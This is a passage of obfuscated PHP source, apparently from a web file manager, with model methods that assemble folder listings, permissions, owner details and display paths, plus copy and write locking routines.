$_SERVER[¤øïŠ‹²]; if (!$áœ€ÔÍü) { return $áœ€ÔÍü; } $‡³¶Îœ = $†ÃÁññ[583]; if ($áœ€ÔÍü[$†ÃÁññ[584]] == $†ÃÁññ[102]) { $‡³¶Îœ .= $†ÃÁññ[585]; } if (is_array($áœ€ÔÍü[$†ÃÁññ[586]]) && is_array($áœ€ÔÍü[$†ÃÁññ[586]][$†ÃÁññ[587]])) { $áœ€ÔÍü[$†ÃÁññ[586]][$†ÃÁññ[587]] = $†ÃÁññ[588]; } if (!$óˆĞä¸œ[$†ÃÁññ[589]] && $óˆĞä¸œ[$†ÃÁññ[204]] != $†ÃÁññ[241]) { $óˆĞä¸œ[$†ÃÁññ[589]] = KodIO::make($óˆĞä¸œ[$†ÃÁññ[204]]); } $áœ€ÔÍü = array_field_key($áœ€ÔÍü, explode($†ÃÁññ[50], $‡³¶Îœ)); return $áœ€ÔÍü; } protected function _listAppendChildren(&$î•µÅ¶÷, $ëÜ§æ´¤) { $²Õ¬ã¬û =& $_SERVER[¤øïŠ‹²]; $âñò‚ôñ = array(); $±è»Àó = array($²Õ¬ã¬û[252] => 0, $²Õ¬ã¬û[253] => 0); foreach ($î•µÅ¶÷ as &$ã‚Ù¡«) { if (!$ã‚Ù¡«[$²Õ¬ã¬û[506]]) { continue; } $âñò‚ôñ[] = intval($ã‚Ù¡«[$²Õ¬ã¬û[204]]); } unset($ã‚Ù¡«); if (!$âñò‚ôñ) { return; } $ñ÷±ÅÃö = array($²Õ¬ã¬û[203] => array($²Õ¬ã¬û[7], $âñò‚ôñ), $²Õ¬ã¬û[526] => 0); $Îòè—À¥ = array($²Õ¬ã¬û[203], $²Õ¬ã¬û[506], $²Õ¬ã¬û[590] => $²Õ¬ã¬û[591]); $û¨Û’ÒÇ = $this->field($Îòè—À¥)->where($ñ÷±ÅÃö)->group($²Õ¬ã¬û[592])->select(); $ê¤ùáœÔ = array(); foreach ($û¨Û’ÒÇ as $®ï ›…Î) { $îÊÁõ¡€ = $®ï ›…Î[$²Õ¬ã¬û[203]]; $–²ıÀŸ = $®ï ›…Î[$²Õ¬ã¬û[506]] == $²Õ¬ã¬û[102] ? $²Õ¬ã¬û[253] : $²Õ¬ã¬û[252]; if (!isset($ê¤ùáœÔ[$îÊÁõ¡€])) { $ê¤ùáœÔ[$îÊÁõ¡€] = array($²Õ¬ã¬û[252] => 0, $²Õ¬ã¬û[253] => 0); } $ê¤ùáœÔ[$îÊÁõ¡€][$–²ıÀŸ] += $®ï ›…Î[$²Õ¬ã¬û[591]]; } foreach ($î•µÅ¶÷ as &$ã‚Ù¡«) { if (!$ã‚Ù¡«[$²Õ¬ã¬û[506]]) { continue; } $¿‰„í» = is_array($ê¤ùáœÔ[$ã‚Ù¡«[$²Õ¬ã¬û[204]]]) ? $ê¤ùáœÔ[$ã‚Ù¡«[$²Õ¬ã¬û[204]]] : $±è»Àó; $ã‚Ù¡«[$²Õ¬ã¬û[253]] = $¿‰„í»[$²Õ¬ã¬û[253]]; $ã‚Ù¡«[$²Õ¬ã¬û[252]] = $¿‰„í»[$²Õ¬ã¬û[252]]; unset($ã‚Ù¡«[$²Õ¬ã¬û[507]]); } unset($ã‚Ù¡«); } protected function _listAppendAuth(&$¸»ø¥ÕÉ) { $ŞÍâÇ½’ =& $_SERVER[¤øïŠ‹²]; $¹ìó„äÉ = array(); foreach ($¸»ø¥ÕÉ as $¿Ûğ¤ãÊ) { if ($¿Ûğ¤ãÊ[$ŞÍâÇ½’[201]] == self::TYPE_GROUP) { $¹ìó„äÉ[] = intval($¿Ûğ¤ãÊ[$ŞÍâÇ½’[204]]); } } if (!$¹ìó„äÉ) { return; } $ğõ±Áì¨ = array_to_keyvalue($¸»ø¥ÕÉ, $ŞÍâÇ½’[204]); $ú‡‹•éÌ = Model($ŞÍâÇ½’[593])->getSourceList($¹ìó„äÉ, $ğõ±Áì¨); $´Î¿Üó• = KodUser::isRoot(); foreach ($¸»ø¥ÕÉ as $¥‡î¦™§ => &$¿Ûğ¤ãÊ) { $¿Ûğ¤ãÊ[$ŞÍâÇ½’[508]] = $ú‡‹•éÌ[$¿Ûğ¤ãÊ[$ŞÍâÇ½’[204]]]; if (!$¿Ûğ¤ãÊ[$ŞÍâÇ½’[508]] && $¿Ûğ¤ãÊ[$ŞÍâÇ½’[201]] == self::TYPE_GROUP) { $¿Ûğ¤ãÊ[$ŞÍâÇ½’[508]] = Action($ŞÍâÇ½’[594])->pathGroupAuthMake($¿Ûğ¤ãÊ[$ŞÍâÇ½’[595]]); if (!$¿Ûğ¤ãÊ[$ŞÍâÇ½’[508]] && !$´Î¿Üó•) { $¿Ûğ¤ãÊ[$ŞÍâÇ½’[246]] = !1; $¿Ûğ¤ãÊ[$ŞÍâÇ½’[245]] = !1; } } if ($¿Ûğ¤ãÊ[$ŞÍâÇ½’[508]]) { $¿Ûğ¤ãÊ[$ŞÍâÇ½’[246]] = AuthModel::authCheckEdit($¿Ûğ¤ãÊ[$ŞÍâÇ½’[508]][$ŞÍâÇ½’[509]]); $¿Ûğ¤ãÊ[$ŞÍâÇ½’[245]] = AuthModel::authCheckView($¿Ûğ¤ãÊ[$ŞÍâÇ½’[508]][$ŞÍâÇ½’[509]]); } $this->groupPathDisplay($¿Ûğ¤ãÊ); } unset($¿Ûğ¤ãÊ); } public function _listAppendAuthSecret(&$áÙ¿™Äı) { $ÃÉèÁğÊ =& $_SERVER[¤øïŠ‹²]; if (Model($ÃÉèÁğÊ[528])->get($ÃÉèÁğÊ[596]) != $ÃÉèÁğÊ[102]) { return; } static $¦ÌµõïÉ = false; if (!$¦ÌµõïÉ) { $ÂËª¶¸‰ = Model($ÃÉèÁğÊ[597]); $êş±©Çé = Model($ÃÉèÁğÊ[598]); $¦ÌµõïÉ = $êş±©Çé->listData(); $¦ÌµõïÉ = array_to_keyvalue($¦ÌµõïÉ, $ÃÉèÁğÊ[204]); $çÕÃ†ñ” = json_decode(Model($ÃÉèÁğÊ[528])->get($ÃÉèÁğÊ[599]), !0); $çÕÃ†ñ” = array_to_keyvalue($çÕÃ†ñ”, $ÃÉèÁğÊ[493]); foreach ($¦ÌµõïÉ as $¥åàäã => $×‘šñ¶Ú) { $‡÷÷Ñ‹“ = $çÕÃ†ñ”[$×‘šñ¶Ú[$ÃÉèÁğÊ[600]]]; if (!$‡÷÷Ñ‹“) { $êş±©Çé->remove($×‘šñ¶Ú[$ÃÉèÁğÊ[493]]); unset($¦ÌµõïÉ[$¥åàäã]); continue; } $¦şÚÚŞô = $ÂËª¶¸‰->listData($‡÷÷Ñ‹“[$ÃÉèÁğÊ[508]]); if (!$¦şÚÚŞô) { $êş±©Çé->remove($×‘šñ¶Ú[$ÃÉèÁğÊ[493]]); unset($¦ÌµõïÉ[$¥åàäã]); continue; } $×‘šñ¶Ú[$ÃÉèÁğÊ[508]] = $¦şÚÚŞô; $×‘šñ¶Ú[$ÃÉèÁğÊ[601]] = $‡÷÷Ñ‹“; $×‘šñ¶Ú[$ÃÉèÁğÊ[602]] = Model($ÃÉèÁğÊ[603])->getInfoSimpleOuter($×‘šñ¶Ú[$ÃÉèÁğÊ[547]]); $¦ÌµõïÉ[$¥åàäã] = $×‘šñ¶Ú; } } $ÄâÎ‘îé = USER_ID; $åšïÚ±÷ = array(); $Í§„öÄ¶ = $this->_listAppendPath($åšïÚ±÷, !0); foreach ($áÙ¿™Äı as $¥åàäã => &$×‘šñ¶Ú) { if (!is_array($×‘šñ¶Ú[$ÃÉèÁğÊ[508]])) { continue; } if ($×‘šñ¶Ú[$ÃÉèÁğÊ[201]] != $ÃÉèÁğÊ[604]) { continue; } if (isset($¦ÌµõïÉ[$×‘šñ¶Ú[$ÃÉèÁğÊ[204]]])) { $¸‘ñÔ Å = $¦ÌµõïÉ[$×‘šñ¶Ú[$ÃÉèÁğÊ[204]]]; if (!is_array($×‘šñ¶Ú[$ÃÉèÁğÊ[561]])) { $×‘šñ¶Ú[$ÃÉèÁğÊ[561]] = array(); } $×‘šñ¶Ú[$ÃÉèÁğÊ[561]][$ÃÉèÁğÊ[605]] = $¸‘ñÔ Å[$ÃÉèÁğÊ[600]]; $×‘šñ¶Ú[$ÃÉèÁğÊ[508]][$ÃÉèÁğÊ[606]] = $¸‘ñÔ Å; $×‘šñ¶Ú[$ÃÉèÁğÊ[508]][$ÃÉèÁğÊ[607]] = $×‘šñ¶Ú[$ÃÉèÁğÊ[608]]; $×‘šñ¶Ú[$ÃÉèÁğÊ[508]][$ÃÉèÁğÊ[609]] = $ÃÉèÁğÊ[102]; if ($¸‘ñÔ Å[$ÃÉèÁğÊ[547]] != $ÄâÎ‘îé) { $×‘šñ¶Ú[$ÃÉèÁğÊ[508]][$ÃÉèÁğÊ[509]] = $×‘šñ¶Ú[$ÃÉèÁğÊ[508]][$ÃÉèÁğÊ[509]] & $¸‘ñÔ Å[$ÃÉèÁğÊ[508]][$ÃÉèÁğÊ[508]]; } continue; } $ò°ûÑ¯â = $this->parentLevelArray($×‘šñ¶Ú[$ÃÉèÁğÊ[610]]); $É°êõ¾Ÿ = array_reverse($ò°ûÑ¯â); foreach ($É°êõ¾Ÿ as $íñÑî…Ò => $¼°˜Œ²¿) { if (!isset($¦ÌµõïÉ[$¼°˜Œ²¿])) { continue; } $¸‘ñÔ Å = $¦ÌµõïÉ[$¼°˜Œ²¿]; $×‘šñ¶Ú[$ÃÉèÁğÊ[508]][$ÃÉèÁğÊ[606]] = $¸‘ñÔ Å; if ($¸‘ñÔ Å[$ÃÉèÁğÊ[547]] != $ÄâÎ‘îé) { $×‘šñ¶Ú[$ÃÉèÁğÊ[508]][$ÃÉèÁğÊ[509]] = $×‘šñ¶Ú[$ÃÉèÁğÊ[508]][$ÃÉèÁğÊ[509]] & $¸‘ñÔ Å[$ÃÉèÁğÊ[508]][$ÃÉèÁğÊ[508]]; } $ºÕû¯¼× = $ÃÉèÁğÊ[12]; $úÇûİõá = count($ò°ûÑ¯â) - $íñÑî…Ò; for ($Ù¶ø·ı = 0; $Ù¶ø·ı < $úÇûİõá; $Ù¶ø·ı++) { if (!isset($Í§„öÄ¶[$ò°ûÑ¯â[$Ù¶ø·ı]])) { $ºÕû¯¼× = $ÃÉèÁğÊ[12]; break; } $ºÕû¯¼× = $ºÕû¯¼× . rtrim($Í§„öÄ¶[$ò°ûÑ¯â[$Ù¶ø·ı]], $ÃÉèÁğÊ[8]) . $ÃÉèÁğÊ[8]; } $×‘šñ¶Ú[$ÃÉèÁğÊ[508]][$ÃÉèÁğÊ[607]] = rtrim($ºÕû¯¼×, $ÃÉèÁğÊ[8]) . $ÃÉèÁğÊ[8]; break; } } unset($×‘šñ¶Ú); } public function groupPathDisplay(&$—ø‚ÊãÕ) { $ÄğëÜõ =& $_SERVER[¤øïŠ‹²]; if ($—ø‚ÊãÕ[$ÄğëÜõ[201]] != self::TYPE_GROUP) { return; } $“ÖÁ¯‚ç = Model($ÄğëÜõ[611])->getInfo($—ø‚ÊãÕ[$ÄğëÜõ[595]]); $‰±”Î­¢ = $this->parentLevelArray($“ÖÁ¯‚ç[$ÄğëÜõ[610]]); $õÕ¯ıˆ˜ = $ÄğëÜõ[12]; foreach ($‰±”Î­¢ as $ÑÑ«É) { $“ñÔÑ„ = Model($ÄğëÜõ[611])->getInfo($ÑÑ«É); $õÕ¯ıˆ˜ .= $“ñÔÑ„[$ÄğëÜõ[101]][$ÄğëÜõ[204]] . $ÄğëÜõ[50]; } $—ø‚ÊãÕ[$ÄğëÜõ[612]] = $“ÖÁ¯‚ç[$ÄğëÜõ[203]]; $—ø‚ÊãÕ[$ÄğëÜõ[613]] = $“ÖÁ¯‚ç[$ÄğëÜõ[610]]; $—ø‚ÊãÕ[$ÄğëÜõ[614]] = $“ÖÁ¯‚ç[$ÄğëÜõ[615]]; $—ø‚ÊãÕ[$ÄğëÜõ[616]] = $õÕ¯ıˆ˜ . $“ÖÁ¯‚ç[$ÄğëÜõ[101]][$ÄğëÜõ[204]]; } protected function _listAppendPath(&$¶•™ôÌ‰, $Ş˜ı¡ºè = false) { $ˆ›ÄñóŸ =& $_SERVER[¤øïŠ‹²]; static $ÃƒŠœü = array(); $»”—¹ÔŒ = array(); $ßÖûŒ×Æ = array(); if ($Ş˜ı¡ºè) { return $ÃƒŠœü; } foreach ($¶•™ôÌ‰ as &$‡èÁ¹ÇÖ) { $ääÂÑàÍ = $‡èÁ¹ÇÖ[$ˆ›ÄñóŸ[204]]; if ($‡èÁ¹ÇÖ[$ˆ›ÄñóŸ[506]] == $ˆ›ÄñóŸ[102] && $‡èÁ¹ÇÖ[$ˆ›ÄñóŸ[203]] != 0) { $ÃƒŠœü[$ääÂÑàÍ] = $‡èÁ¹ÇÖ[$ˆ›ÄñóŸ[32]]; } if ($‡èÁ¹ÇÖ[$ˆ›ÄñóŸ[506]] == $ˆ›ÄñóŸ[102] && $‡èÁ¹ÇÖ[$ˆ›ÄñóŸ[203]] == 0) { $ÃƒŠœü[$ääÂÑàÍ] = $this->_listAppendPathRoot($‡èÁ¹ÇÖ, array()); } if (isset($ßÖûŒ×Æ[$‡èÁ¹ÇÖ[$ˆ›ÄñóŸ[610]]])) { continue; } $ßÖûŒ×Æ[$‡èÁ¹ÇÖ[$ˆ›ÄñóŸ[610]]] = !0; $±¹ÖêèŞ = $this->parentLevelArray($‡èÁ¹ÇÖ[$ˆ›ÄñóŸ[610]]); foreach ($±¹ÖêèŞ as $ıÁ¾ĞÛ => $÷·À»™) { if (isset($ÃƒŠœü[$÷·À»™])) { continue; } if ($ıÁ¾ĞÛ == 0) { $ÃƒŠœü[$÷·À»™] = $this->_listAppendPathRoot($‡èÁ¹ÇÖ, $±¹ÖêèŞ); } if ($ıÁ¾ĞÛ != 0) { $»”—¹ÔŒ[] = $÷·À»™; } } } unset($‡èÁ¹ÇÖ); $»”—¹ÔŒ = array_unique($»”—¹ÔŒ); if (count($»”—¹ÔŒ) > 0) { $Ìñú‚ô• = array($ˆ›ÄñóŸ[512] => array($ˆ›ÄñóŸ[513], $»”—¹ÔŒ)); if (count($»”—¹ÔŒ) == 1) { $‘Ò™óïÛ = $this->sourceInfo($»”—¹ÔŒ[0]); $É›©Ï­Š = is_array($‘Ò™óïÛ) ? array($‘Ò™óïÛ) : !1; } else { $É›©Ï­Š = $this->field($ˆ›ÄñóŸ[617])->where($Ìñú‚ô•)->select(); } if (!$É›©Ï­Š) { $É›©Ï­Š = array(); } foreach ($É›©Ï­Š as $Õß¾õÌÀ) { $ÃƒŠœü[$Õß¾õÌÀ[$ˆ›ÄñóŸ[204]]] = $Õß¾õÌÀ[$ˆ›ÄñóŸ[32]]; } } $İ†ÂßòÑ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $«€¸®·ì = array(); foreach ($¶•™ôÌ‰ as &$‡èÁ¹ÇÖ) { $‚‘ˆ¬Ïˆ = $‡èÁ¹ÇÖ[$ˆ›ÄñóŸ[610]]; $Œƒ¨ñğÑ = $ˆ›ÄñóŸ[12]; if (isset($«€¸®·ì[$‚‘ˆ¬Ïˆ])) { $Œƒ¨ñğÑ = $«€¸®·ì[$‚‘ˆ¬Ïˆ]; } else { $±¹ÖêèŞ = $this->parentLevelArray($‡èÁ¹ÇÖ[$ˆ›ÄñóŸ[610]]); foreach ($±¹ÖêèŞ as $ıÁ¾ĞÛ => $÷·À»™) { if (isset($ÃƒŠœü[$÷·À»™])) { $Œƒ¨ñğÑ .= $ÃƒŠœü[$÷·À»™] . $ˆ›ÄñóŸ[8]; } } $«€¸®·ì[$‚‘ˆ¬Ïˆ] = $Œƒ¨ñğÑ; } $Œƒ¨ñğÑ .= $‡èÁ¹ÇÖ[$ˆ›ÄñóŸ[32]]; if ($‡èÁ¹ÇÖ[$ˆ›ÄñóŸ[506]] == $ˆ›ÄñóŸ[102]) { $Œƒ¨ñğÑ .= $ˆ›ÄñóŸ[8]; } $‡èÁ¹ÇÖ[$ˆ›ÄñóŸ[608]] = str_replace($ˆ›ÄñóŸ[267], $ˆ›ÄñóŸ[8], $Œƒ¨ñğÑ); if ($‡èÁ¹ÇÖ[$ˆ›ÄñóŸ[203]] == $ˆ›ÄñóŸ[241]) { $‡èÁ¹ÇÖ[$ˆ›ÄñóŸ[32]] = trim($ÃƒŠœü[$‡èÁ¹ÇÖ[$ˆ›ÄñóŸ[204]]], $ˆ›ÄñóŸ[8]); $‡èÁ¹ÇÖ[$ˆ›ÄñóŸ[608]] = $‡èÁ¹ÇÖ[$ˆ›ÄñóŸ[32]] . $ˆ›ÄñóŸ[8]; } if (intval($‡èÁ¹ÇÖ[$ˆ›ÄñóŸ[201]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($‡èÁ¹ÇÖ, $±¹ÖêèŞ, $İ†ÂßòÑ); } } unset($‡èÁ¹ÇÖ); return $¶•™ôÌ‰; } private function _listAppendPathRecycle(&$³²¹ö°®, $‚›‰‡, $ûĞÏ¤§ø) { $ÖÈÀö¶Ã =& $_SERVER[¤øïŠ‹²]; if (!in_array($ûĞÏ¤§ø, $‚›‰‡) && $³²¹ö°®[$ÖÈÀö¶Ã[204]] != $ûĞÏ¤§ø) { return; } $÷¿»ğ´› = explode($ÖÈÀö¶Ã[8], trim($³²¹ö°®[$ÖÈÀö¶Ã[608]], $ÖÈÀö¶Ã[8])); $âÃ«Û¬ø = implode($ÖÈÀö¶Ã[8], array_slice($÷¿»ğ´›, 2)); $³²¹ö°®[$ÖÈÀö¶Ã[608]] = $ÖÈÀö¶Ã[8] . LNG($ÖÈÀö¶Ã[618]) . $ÖÈÀö¶Ã[8] . ltrim($âÃ«Û¬ø, $ÖÈÀö¶Ã[8]); $³²¹ö°®[$ÖÈÀö¶Ã[610]] = $ÖÈÀö¶Ã[619] . implode($ÖÈÀö¶Ã[50], array_slice($‚›‰‡, 1)) . $ÖÈÀö¶Ã[50]; if ($³²¹ö°®[$ÖÈÀö¶Ã[204]] == $ûĞÏ¤§ø) { $³²¹ö°®[$ÖÈÀö¶Ã[610]] = $ÖÈÀö¶Ã[619]; $³²¹ö°®[$ÖÈÀö¶Ã[203]] = $ÖÈÀö¶Ã[241]; $³²¹ö°®[$ÖÈÀö¶Ã[32]] = LNG($ÖÈÀö¶Ã[618]); } $³²¹ö°®[$ÖÈÀö¶Ã[620]] = $ÖÈÀö¶Ã[621]; } protected function _listAppendPathRoot(&$Ã‹À‹, $ãôÈ˜õÚ) { $Ğ‹µØ‡ı =& $_SERVER[¤øïŠ‹²]; static $ã«ê³â = false; static $œÂ‡œ = false; $ğòø›÷ = $Ğ‹µØ‡ı[12]; if ($Ã‹À‹[$Ğ‹µØ‡ı[201]] == self::TYPE_USER) { if ($Ã‹À‹[$Ğ‹µØ‡ı[595]] == USER_ID) { $ğòø›÷ = LNG($Ğ‹µØ‡ı[622]); if ($ã«ê³â === !1) { $È¾Õ¥’£ = Model($Ğ‹µØ‡ı[623])->getInfoFull(USER_ID); $ã«ê³â = _get($È¾Õ¥’£, $Ğ‹µØ‡ı[624], $Ğ‹µØ‡ı[12]); } if ($œÂ‡œ === !1) { $È¾Õ¥’£ = Model($Ğ‹µØ‡ı[623])->getInfoFull(USER_ID); $œÂ‡œ = _get($È¾Õ¥’£, $Ğ‹µØ‡ı[625], $Ğ‹µØ‡ı[12]); } if ($ãôÈ˜õÚ && $ãôÈ˜õÚ[0] == $ã«ê³â || !$ãôÈ˜õÚ && $Ã‹À‹[$Ğ‹µØ‡ı[204]] == $ã«ê³â) { $ğòø›÷ = LNG($Ğ‹µØ‡ı[626]); $Ã‹À‹[$Ğ‹µØ‡ı[627]] = $Ğ‹µØ‡ı[628]; } if ($ãôÈ˜õÚ && $ãôÈ˜õÚ[0] == $œÂ‡œ || !$ãôÈ˜õÚ && $Ã‹À‹[$Ğ‹µØ‡ı[204]] == $œÂ‡œ) { $ğòø›÷ = $ğòø›÷ . $Ğ‹µØ‡ı[629] . LNG($Ğ‹µØ‡ı[630]); } if (!$ãôÈ˜õÚ) { $Ã‹À‹[$Ğ‹µØ‡ı[32]] = $ğòø›÷; } } else { $È¾Õ¥’£ = Model($Ğ‹µØ‡ı[623])->getInfoFull($Ã‹À‹[$Ğ‹µØ‡ı[595]]); $ÌêûÑ€ = _get($È¾Õ¥’£, $Ğ‹µØ‡ı[625], $Ğ‹µØ‡ı[12]); $Ã‹À‹[$Ğ‹µØ‡ı[631]] = Model($Ğ‹µØ‡ı[603])->getInfoSimpleOuter($Ã‹À‹[$Ğ‹µØ‡ı[595]]); $ğòø›÷ = LNG($Ğ‹µØ‡ı[632]) . $Ğ‹µØ‡ı[186] . $Ã‹À‹[$Ğ‹µØ‡ı[631]][$Ğ‹µØ‡ı[32]] . $Ğ‹µØ‡ı[188]; if ($ãôÈ˜õÚ && $ãôÈ˜õÚ[0] == $ÌêûÑ€ || !$ãôÈ˜õÚ && $Ã‹À‹[$Ğ‹µØ‡ı[204]] == $ÌêûÑ€) { $ğòø›÷ = LNG($Ğ‹µØ‡ı[632]) . $Ğ‹µØ‡ı[633] . $Ã‹À‹[$Ğ‹µØ‡ı[631]][$Ğ‹µØ‡ı[32]] . $Ğ‹µØ‡ı[629] . LNG($Ğ‹µØ‡ı[630]) . $Ğ‹µØ‡ı[188]; } } } else { if ($Ã‹À‹[$Ğ‹µØ‡ı[201]] == self::TYPE_GROUP) { $¹–·Å„Ë = Model($Ğ‹µØ‡ı[611])->getInfoSimple($Ã‹À‹[$Ğ‹µØ‡ı[595]]); $ğòø›÷ = $¹–·Å„Ë[$Ğ‹µØ‡ı[32]]; } else { if ($Ã‹À‹[$Ğ‹µØ‡ı[201]] == self::TYPE_SYSTEM) { $ğòø›÷ = $Ğ‹µØ‡ı[634]; } } } $ğòø›÷ = $ğòø›÷ ? $Ğ‹µØ‡ı[8] . $ğòø›÷ . $Ğ‹µØ‡ı[8] : $Ğ‹µØ‡ı[8]; return $ğòø›÷; } protected function _listAppendUser(&$ºÑæë×õ) { $·Üï¾¥ˆ =& $_SERVER[¤øïŠ‹²]; $‚ïÏ„ = array_to_keyvalue($ºÑæë×õ, $·Üï¾¥ˆ[12], $·Üï¾¥ˆ[547]); $‘×º¸Ö» = array_to_keyvalue($ºÑæë×õ, $·Üï¾¥ˆ[12], $·Üï¾¥ˆ[549]); $ÖÈ„ì÷û = array_merge($‚ïÏ„, $‘×º¸Ö»); $Ğ…ùº¬ş = Model($·Üï¾¥ˆ[623])->userListInfo($ÖÈ„ì÷û); foreach ($ºÑæë×õ as &$‚âŞ‰à) { $êÉ«†¶¤ = $‚âŞ‰à[$·Üï¾¥ˆ[547]]; $‚âŞ‰à[$·Üï¾¥ˆ[547]] = $Ğ…ùº¬ş[$êÉ«†¶¤] ? $Ğ…ùº¬ş[$êÉ«†¶¤] : !1; $êÉ«†¶¤ = $‚âŞ‰à[$·Üï¾¥ˆ[549]]; $‚âŞ‰à[$·Üï¾¥ˆ[549]] = $Ğ…ùº¬ş[$êÉ«†¶¤] ? $Ğ…ùº¬ş[$êÉ«†¶¤] : !1; if (_get($‚âŞ‰à, $·Üï¾¥ˆ[635], 0)) { $áù¥ØÏá = $GLOBALS[$·Üï¾¥ˆ[6]][$·Üï¾¥ˆ[103]][$·Üï¾¥ˆ[636]]; if ($‚âŞ‰à[$·Üï¾¥ˆ[561]][$·Üï¾¥ˆ[637]] <= time() - $áù¥ØÏá) { $this->metaSet($‚âŞ‰à[$·Üï¾¥ˆ[204]], $·Üï¾¥ˆ[638], null); $this->metaSet($‚âŞ‰à[$·Üï¾¥ˆ[204]], $·Üï¾¥ˆ[637], null); unset($‚âŞ‰à[$·Üï¾¥ˆ[561]][$·Üï¾¥ˆ[638]]); continue; } $•ÑÏˆ¨¶ = $‚âŞ‰à[$·Üï¾¥ˆ[561]][$·Üï¾¥ˆ[638]]; $‚âŞ‰à[$·Üï¾¥ˆ[561]][$·Üï¾¥ˆ[639]] = Model($·Üï¾¥ˆ[623])->getInfoSimpleOuter($•ÑÏˆ¨¶); } } unset($‚âŞ‰à); } public function parentLevelArray($ğúáï‰Ç) { $Ğ±Ûùµ =& $_SERVER[¤øïŠ‹²]; $ğúáï‰Ç = explode($Ğ±Ûùµ[50], trim($ğúáï‰Ç, $Ğ±Ûùµ[50])); return array_to_int(array_filter($ğúáï‰Ç)); } public function listAll($â›ı‘÷–) { $öİ½×ı =& $_SERVER[¤øïŠ‹²]; $ÕÃŞéã£ = $this->sourceInfo($â›ı‘÷–); $êèºÏ¾¯ = array($öİ½×ı[640] => array($öİ½×ı[641], $ÕÃŞéã£[$öİ½×ı[610]] . $â›ı‘÷– . $öİ½×ı[642]), $öİ½×ı[643] => 0); $·×‡ğ½ˆ = $öİ½×ı[644]; $ç”ûæãô = "\114\105\106\124\x20\x4a\117\111\x4e\x20{$this->tablePrefix}\151\157\137\146\x69\154\x65\x20\146\x69\x6c\x65\40\157\156\x20\163\157\x75\162\x63\145\56\x66\151\154\145\x49\104\x20\x3d\40\x66\151\154\x65\x2e\146\151\154\x65\x49\x44"; $îÊÔëÛŠ = $this->alias($öİ½×ı[539])->field($·×‡ğ½ˆ)->where($êèºÏ¾¯)->join($ç”ûæãô)->select(); $this->_listAppendAuth($îÊÔëÛŠ); $this->_listAppendUser($îÊÔëÛŠ); $this->_listAppendPath($îÊÔëÛŠ); $îÊÔëÛŠ = array_to_keyvalue($îÊÔëÛŠ, $öİ½×ı[204]); $ëø“°„Ş = "\57{$ÕÃŞéã£[$öİ½×ı[32]]}\x2f"; $ëø“°„Ş = $ëø“°„Ş == $öİ½×ı[267] ? $öİ½×ı[8] : $ëø“°„Ş; $¶¬ø½Ïø = array(); foreach ($îÊÔëÛŠ as $¢‹ÜĞ¡ => $…øåıñì) { $§ïçæ°Ë = $this->parentLevelArray($…øåıñì[$öİ½×ı[610]]); array_shift($§ïçæ°Ë); $‚ôÚ¯Ü» = $ëø“°„Ş; for ($¯¿ÛÃ£¹ = 0; $¯¿ÛÃ£¹ < count($§ïçæ°Ë); $¯¿ÛÃ£¹++) { $‚ôÚ¯Ü» .= $îÊÔëÛŠ[$§ïçæ°Ë[$¯¿ÛÃ£¹]][$öİ½×ı[32]] . $öİ½×ı[8]; } $‚ôÚ¯Ü» .= $…øåıñì[$öİ½×ı[32]]; if ($…øåıñì[$öİ½×ı[506]]) { $‚ôÚ¯Ü» .= $öİ½×ı[8]; } $ËŸş‚Éå = array($öİ½×ı[516] => str_replace($öİ½×ı[267], $öİ½×ı[8], str_replace($öİ½×ı[267], $öİ½×ı[8], str_replace($öİ½×ı[267], $öİ½×ı[8], $‚ôÚ¯Ü»))), $öİ½×ı[645] => intval($…øåıñì[$öİ½×ı[506]]), $öİ½×ı[646] => intval($…øåıñì[$öİ½×ı[90]]), $öİ½×ı[99] => intval($…øåıñì[$öİ½×ı[99]]), $öİ½×ı[101] => $this->pathInfoFilter($…øåıñì)); if (!$ËŸş‚Éå[$öİ½×ı[506]]) { $ËŸş‚Éå[$öİ½×ı[563]] = $…øåıñì[$öİ½×ı[563]]; } $¶¬ø½Ïø[] = $ËŸş‚Éå; } $¶¬ø½Ïø = array_sort_by($¶¬ø½Ïø, $öİ½×ı[98]); return $¶¬ø½Ïø; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Ü‡ùŒ£‘) { $÷ä°ËğÓ =& $_SERVER[¤øïŠ‹²]; if (!$this->allowLock()) { return; } $this->_lockCheck($÷ä°ËğÓ[647], $Ü‡ùŒ£‘); $¸áœ‰ªâ = 1; $this->_lockEvent($Ü‡ùŒ£‘, array($÷ä°ËğÓ[648], $÷ä°ËğÓ[649]), $¸áœ‰ªâ); $this->_lockParent($Ü‡ùŒ£‘, array($÷ä°ËğÓ[649]), $¸áœ‰ªâ); $this->_lockEvent($Ü‡ùŒ£‘, array($÷ä°ËğÓ[650], $÷ä°ËğÓ[651]), $¸áœ‰ªâ); $this->_lockCheckEnd($÷ä°ËğÓ[647], $Ü‡ùŒ£‘); } public function lockCopyEnd($à“ ÊÛ) { $¶­Ğò€ =& $_SERVER[¤øïŠ‹²]; if (!$this->allowLock()) { return; } $Ü½ÊåŒê = 0; $this->_lockEvent($à“ ÊÛ, array($¶­Ğò€[648], $¶­Ğò€[649]), $Ü½ÊåŒê); $this->_lockParent($à“ ÊÛ, array($¶­Ğò€[649]), $Ü½ÊåŒê); $this->_lockEvent($à“ ÊÛ, array($¶­Ğò€[650], $¶­Ğò€[651]), $Ü½ÊåŒê); } public function lockWriteStart($¨‘ŞıÈã, $‹êšÃÖ‘ = '') { $Û¯İµš³ =& $_SERVER[¤øïŠ‹²]; if (!$this->allowLock()) { return; } $this->_lockCheck($Û¯İµš³[648], $¨‘ŞıÈã); $Òş»‡—¦ = 1; $this->_lockKey($Û¯İµš³[652] . $¨‘ŞıÈã . $Û¯İµš³[10] . $‹êšÃÖ‘, $Òş»‡—¦); $this->_lockEvent($¨‘ŞıÈã, array($Û¯İµš³[647], $Û¯İµš³[649]), $Òş»‡—¦); $this->_lockParent($¨‘ŞıÈã, array($Û¯İµš³[647], $Û¯İµš³[649]), $Òş»‡—¦); $this->_lockCheckEnd($Û¯İµš³[648], $¨‘ŞıÈã); } public function lockWriteEnd($“úîÄ¥, $‡Àµí• = '') { $ö¢Âô×† =& $_SERVER[¤øïŠ‹²]; if (!$this->allowLock()) { return; } $¾ÀÁëú = 0; $this->_lockKey($ö¢Âô×†[652] . $“úîÄ¥ . $ö¢Âô×†[10] . $‡Àµí•, $¾ÀÁëú); $this->_lockEvent($“úîÄ¥, array($ö¢Âô×†[647], $ö¢Âô×†[649]), $¾ÀÁëú); $this->_lockParent($“úîÄ¥, 